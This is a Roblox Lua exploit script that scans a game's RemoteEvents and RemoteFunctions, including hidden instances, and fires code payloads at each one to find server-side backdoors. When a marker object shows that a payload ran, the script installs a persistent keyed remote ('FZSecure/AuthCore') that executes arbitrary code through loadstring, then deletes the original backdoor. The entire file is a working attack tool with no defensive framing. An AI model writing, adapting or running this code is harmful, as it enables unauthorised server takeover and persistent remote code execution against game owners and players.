local DEBUG = false
local FZSECURE_MODE = true

local alphabet = {}
for i = 48,57 do table.insert(alphabet,string.char(i)) end
for i = 65,90 do table.insert(alphabet,string.char(i)) end
for i = 97,122 do table.insert(alphabet,string.char(i)) end
for _,c in ipairs({'_','-','!','@','#','$','%','^','&','*','+','=','~'}) do table.insert(alphabet,c) end

_G.backdoor = nil
_G.backdoorPath = nil
_G.backdoorFound = false
_G.fzsecureBackdoor = nil

local function generateName(len)
	local name = ""
	for i = 1,len do
		name = name .. alphabet[math.random(1,#alphabet)]
	end
	return name
end

local function getDynamicKey()
	return tostring(game.PlaceId * 1337 + 42424242) .. "_" .. (game.JobId ~= "" and game.JobId:sub(1,10) or "local")
end

local DYNAMIC_KEY = getDynamicKey()

_G.fireRemote = function(remote,payload)
	if remote:IsA("RemoteEvent") then
		pcall(function() remote:FireServer(payload) end)
	elseif remote:IsA("RemoteFunction") then
		task.spawn(function() pcall(remote.InvokeServer,remote,payload) end)
	end
end

local function generateStealthMarker(rand)
	return [[
local marker = Instance.new("IntValue")
marker.Name = "]]..rand..[["
marker.Value = 13371337
marker.Parent = workspace.Terrain
task.delay(3,function()
	if marker and marker.Parent then pcall(function() marker:Destroy() end) end
end)
]]
end

local function firePayloads(remote,rand)
	local code = generateStealthMarker(rand)
	local payloads = {}
	table.insert(payloads,code)
	table.insert(payloads,{code=code})
	table.insert(payloads,{script=code})
	table.insert(payloads,{source=code})
	table.insert(payloads,{execute=code})
	table.insert(payloads,{cmd="eval",code=code})
	table.insert(payloads,{["code"]=code})
	table.insert(payloads,{["source"]=code})
	table.insert(payloads,{args={code}})

	if FZSECURE_MODE then
		table.insert(payloads,{key=DYNAMIC_KEY,code=code})
		table.insert(payloads,{auth="fzsecure",key=DYNAMIC_KEY,code=code})
		table.insert(payloads,{handshake="FZSecure_Client_v2",verify=code})
	end

	for _,p in ipairs(payloads) do
		task.spawn(function() _G.fireRemote(remote,p) end)
	end

	if remote:IsA("RemoteFunction") then
		task.spawn(function()
			pcall(function()
				local keys = {"source","code","execute","script","key","cmd"}
				for _,k in ipairs(keys) do
					remote:InvokeServer(k,code)
					remote:InvokeServer(k,{code=code})
					if FZSECURE_MODE then
						remote:InvokeServer(k,{key=DYNAMIC_KEY,code=code})
					end
				end
			end)
		end)
	end
end

local function fireExec(remote,execCode)
	local payloads = {}
	table.insert(payloads,execCode)
	table.insert(payloads,{code=execCode})
	table.insert(payloads,{source=execCode})
	table.insert(payloads,{key=DYNAMIC_KEY,code=execCode})
	table.insert(payloads,{auth="fzsecure",key=DYNAMIC_KEY,code=execCode})

	for _,p in ipairs(payloads) do
		task.spawn(function() _G.fireRemote(remote,p) end)
	end
end

local function scan()
	local tests = {}
	local rs = game:GetService("ReplicatedStorage")

	for _,n in ipairs({"MainRemote","Remote","Execute","Server","Backdoor","Admin","Fire","Invoke","Comm","Communication","Executor","re","rf","r","Event","Function","Main"}) do
		local r = rs:FindFirstChild(n)
		if r and (r:IsA("RemoteEvent") or r:IsA("RemoteFunction")) then
			local rand = generateName(math.random(24,36))
			firePayloads(r,rand)
			tests[rand] = {remote=r,path=r:GetFullName()}
		end
	end

	local all = game:GetDescendants()
	if getnilinstances then for _,i in ipairs(getnilinstances()) do table.insert(all,i) end end
	if getinstances then for _,i in ipairs(getinstances()) do table.insert(all,i) end end

	for _,r in ipairs(all) do
		if not (r:IsA("RemoteEvent") or r:IsA("RemoteFunction")) then continue end
		local fn = r:GetFullName()
		if fn:find("^RobloxReplicatedStorage") or fn:find("Players%.LocalPlayer") or fn:find("DefaultChatSystem") or r.Name == "__FUNCTION" then continue end
		local rand = generateName(math.random(24,36))
		firePayloads(r,rand)
		tests[rand] = {remote=r,path=fn}
	end

	for i = 1,600 do
		for rand,info in pairs(tests) do
			local marker = workspace.Terrain:FindFirstChild(rand)
			if marker and marker:IsA("IntValue") and marker.Value == 13371337 then
				pcall(function() marker:Destroy() end)

				_G.backdoor = info.remote
				_G.backdoorPath = info.path
				_G.backdoorFound = true

				if FZSECURE_MODE then
					local installerCode = [[
local key = "]]..DYNAMIC_KEY..[["
local rs = game:GetService("ReplicatedStorage")
if rs:FindFirstChild("FZSecure") then rs.FZSecure:Destroy() end
local container = Instance.new("Folder",rs)
container.Name = "FZSecure"
local newRemote = Instance.new("RemoteFunction",container)
newRemote.Name = "AuthCore"
local attempts = {}
newRemote.OnServerInvoke = function(plr,payload)
	local uid = plr.UserId
	attempts[uid] = (attempts[uid] or 0) + 1
	if attempts[uid] > 12 then newRemote:Destroy() return nil end
	if typeof(payload) == "table" then
		if payload.handshake == "FZSecure_Client_v2" then return "FZ_AUTH_SUCCESS" end
		if payload.key == key and payload.code then
			local func = loadstring(payload.code)
			if func then
				task.spawn(function()
					local success,result = pcall(func)
					if not success then warn("FZSecure warning: "..tostring(result)) end
				end)
			end
			return "EXECUTED"
		end
	end
	return nil
end
pcall(function()
	local obj = game
	for _,part in string.split("]]..info.path..[[",".") do
		obj = obj:FindFirstChild(part)
		if not obj then break end
	end
	if obj then obj:Destroy() end
end)
]]

					fireExec(info.remote,installerCode)

					task.wait(0.6)

					local container = rs:FindFirstChild("FZSecure")
					if container then
						local newBd = container:FindFirstChild("AuthCore")
						if newBd then
							_G.fzsecureBackdoor = newBd
							_G.backdoor = newBd
							_G.backdoorPath = newBd:GetFullName()
						end
					end
				end

				return true
			end
		end
		task.wait(0.025)
	end
	return false
end

task.spawn(scan)
